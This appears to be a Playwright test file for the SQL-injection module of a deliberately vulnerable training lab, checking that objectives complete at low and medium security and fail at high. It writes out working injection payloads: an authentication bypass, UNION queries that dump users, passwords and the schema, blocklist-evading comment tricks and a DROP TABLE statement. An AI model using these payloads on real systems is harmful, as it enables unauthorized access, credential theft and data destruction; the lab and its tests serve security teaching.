const { test } = require("@playwright/test");
const { openLab, setLevel, expectDone, clearObjective, expect } = require("./helpers");

const ready = (page) => expect(page.locator("#db-status")).toHaveClass(/badge-ok/, { timeout: 30_000 });
const search = async (page, q) => { await page.fill("#search-q", q); await page.click("#search-form button"); };
const login = async (page, u, p) => { await page.fill("#login-user", u); await page.fill("#login-pass", p); await page.click("#login-form button"); };

test.describe("SQL injection", () => {
  test.beforeEach(async ({ page }) => { await openLab(page, "sql-injection"); await ready(page); });

  test("Low: login bypass, UNION dump, schema enumeration", async ({ page }) => {
    await setLevel(page, "low");
    await login(page, "admin'--", "x");
    await expect(page.locator("#login-results")).toContainText("Welcome back, admin");
    await expectDone(page, "sqli-login");

    await search(page, "' UNION SELECT id, username, password, role FROM users--");
    await expect(page.locator("#search-results")).toContainText("Summer2026!");
    await expectDone(page, "sqli-union");

    await search(page, "' UNION SELECT 1, name, sql, 4 FROM sqlite_master--");
    await expect(page.locator("#search-results")).toContainText("internal_secrets");
    await search(page, "' UNION SELECT id, note, value, 4 FROM internal_secrets--");
    await expectDone(page, "sqli-flag");
  });

  test("Low: stacked statements are rejected like better-sqlite3", async ({ page }) => {
    await setLevel(page, "low");
    await search(page, "'; DROP TABLE users;--");
    await expect(page.locator("#search-results")).toContainText("more than one statement");
    await search(page, "x'; select 1,2,3,4 from users;--");
    await expect(page.locator("#search-results")).toContainText("more than one statement");
    await expectDone(page, "sqli-union", false);
  });

  test("Medium: case and comment tricks beat the blocklist", async ({ page }) => {
    await setLevel(page, "medium");
    await login(page, "admin'/*", "x");
    await expect(page.locator("#login-results")).toContainText("Welcome back, admin");
    await expectDone(page, "sqli-medium");
    await search(page, "' union select id, username, password, role from users/*");
    await expect(page.locator("#search-results")).toContainText("correct-horse-battery");
  });

  test("High: parameterized queries stop every payload but keep features working", async ({ page }) => {
    await setLevel(page, "high");
    await login(page, "admin'--", "x");
    await expect(page.locator("#login-results")).toContainText("401");
    await search(page, "' UNION SELECT id, username, password, role FROM users--");
    await expect(page.locator("#search-results")).not.toContainText("Summer2026!");
    await login(page, "admin", "Xk9#vQ2m!Lp7");
    await expect(page.locator("#login-results")).toContainText("Welcome back, admin");
    await search(page, "key");
    await expect(page.locator("#search-results")).toContainText("Mechanical Keyboard");
    await expectDone(page, "sqli-login", false);
  });

  test("Every hint's answer, filled in and sent, earns its objective", async ({ page }) => {
    const hints = await page.evaluate(() =>
      window.MVWA.getModule("sql-injection").hints.map((h) => ({ objective: h.objective, steps: h.steps.map((s) => s.send) })));
    expect(hints.length).toBe(4);
    for (let i = 0; i < hints.length; i++) {
      const hint = page.locator("details.hint").nth(i);
      await hint.locator(":scope > summary").click();
      await hint.locator("details.hint-answer > summary").click();
      for (let j = 0; j < hints[i].steps.length; j++) {
        await hint.locator(".hint-try").nth(j).click();
        await page.click(hints[i].steps[j]);
      }
      await expectDone(page, hints[i].objective);
      await expect(hint).toHaveClass(/done/);
    }
  });

  test("Hints stay open when an objective completes", async ({ page }) => {
    await setLevel(page, "low");
    await page.click("details.hint summary");
    await login(page, "admin'--", "x");
    await expectDone(page, "sqli-login");
    await expect(page.locator("details.hint").first()).toHaveAttribute("open", "");
  });
});
